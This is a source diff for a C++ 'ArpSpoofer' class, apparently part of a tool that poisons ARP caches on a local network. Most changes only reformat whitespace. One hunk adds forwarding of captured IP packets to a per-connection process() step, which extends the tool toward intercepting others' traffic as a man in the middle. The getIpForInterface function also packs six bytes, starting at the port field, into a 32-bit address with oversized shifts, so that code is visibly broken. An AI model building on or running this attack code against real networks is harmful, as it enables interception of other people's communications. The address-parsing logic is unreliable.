@@ -11,13 +11,13 @@
 
 #include <stdio.h>
 
-ArpSpoofer::ArpSpoofer(std::string pInterfaceName): connections(), interfaceName(pInterfaceName),
-						    macAddr(getMacForInterface(interfaceName)),
-						    ipAddr(getIpForInterface(interfaceName)),
-						    spoofing(false) {}
+ArpSpoofer::ArpSpoofer(std::string pInterfaceName) : connections(), interfaceName(pInterfaceName),
+                                                     macAddr(getMacForInterface(interfaceName)),
+                                                     ipAddr(getIpForInterface(interfaceName)),
+                                                     spoofing(false) { }
 
 bool ArpSpoofer::addConnection(const ArpConnection& connection) {
-  if(spoofing) return false;
+  if (spoofing) return false;
 
   connections.push_back(connection);
   return true;
@@ -25,7 +25,7 @@ bool ArpSpoofer::addConnection(const ArpConnection& connection) {
 
 void ArpSpoofer::spoof(uint64_t spoofAddr) {
   spoofing = true;
-  for(auto& con: connections) {
+  for (auto& con: connections) {
     con.spoof(spoofAddr);
   }
 
@@ -36,17 +36,23 @@ void ArpSpoofer::spoof(uint64_t spoofAddr) {
   const u_char* packet;
   struct pcap_pkthdr header;
 
-  while(spoofing) {
+  while (spoofing) {
     packet = pcap_next(handle, &header);
     struct etherhdr* eth_header = (struct etherhdr*) packet;
 
-    if(eth_header && ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
-      ARPPacket arpPacket(packet);
-      //if packet is arp request...
-      if(arpPacket.getOperation() == ARPPacket::Operation::request) {
-	      for(auto& con: connections) {
-	        con.spoofBack(packet, spoofAddr);
-	      }
+    if (eth_header) {
+      if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
+        ARPPacket arpPacket(packet);
+        //if packet is arp request...
+        if (arpPacket.getOperation() == ARPPacket::Operation::request) {
+          for (auto& con: connections) {
+            con.spoofBack(packet, spoofAddr);
+          }
+        }
+      } else if(ntohs(eth_header->ether_type) == ETHERTYPE_IP) {
+        for(auto& con: connections) {
+          con.process(packet);
+        }
       }
     }
   }
@@ -67,10 +73,10 @@ uint64_t ArpSpoofer::getMacForInterface(std::string ifName) {
   close(rsocket);
 
   uint64_t value = 0;
-  for(int i = 0; i < 6; ++i) {
+  for (int i = 0; i < 6; ++i) {
     uint64_t tmp = buffer.ifr_hwaddr.sa_data[i];
     tmp &= 0xFF;
-    value |= (tmp  << (8 * (6 - i - 1)));
+    value |= (tmp << (8 * (6 - i - 1)));
   }
   return value;
 }
@@ -85,9 +91,9 @@ uint32_t ArpSpoofer::getIpForInterface(std::string ifName) {
   ioctl(rsocket, SIOCGIFADDR, &buffer);
   close(rsocket);
 
-  char* chr = inet_ntoa(((struct sockaddr_in *)&buffer.ifr_addr)->sin_addr);
+  char* chr = inet_ntoa(((struct sockaddr_in*) &buffer.ifr_addr)->sin_addr);
   uint32_t value = 0;
-  for(int i = 0; i < 6; ++i) {
+  for (int i = 0; i < 6; ++i) {
     uint32_t tmp = buffer.ifr_addr.sa_data[i];
     tmp &= 0xFF;
     value |= (tmp << (8 * (6 - i - 1)));
